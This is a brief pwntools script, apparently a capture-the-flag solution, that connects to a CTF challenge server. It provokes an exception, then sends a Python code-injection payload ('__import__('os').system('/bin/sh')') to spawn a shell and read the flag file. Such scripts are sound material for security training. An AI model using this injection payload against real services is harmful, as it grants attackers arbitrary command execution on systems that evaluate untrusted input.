from pwn import *

# connect to the remote instance
r = remote("chal.ctf-league.osusec.org", 6969)

# send text and file name that will cause an exception
r.recvuntil(b":")
r.sendline(b"123")
r.recvuntil(b":")
r.sendline(b"abc.txt")
r.recvline()

# send python code to create a shell
r.recvuntil(b":")
r.sendline(b"__import__('os').system('/bin/sh')")

# get the flag
r.sendline(b"cat flag.txt")
print(r.recvline())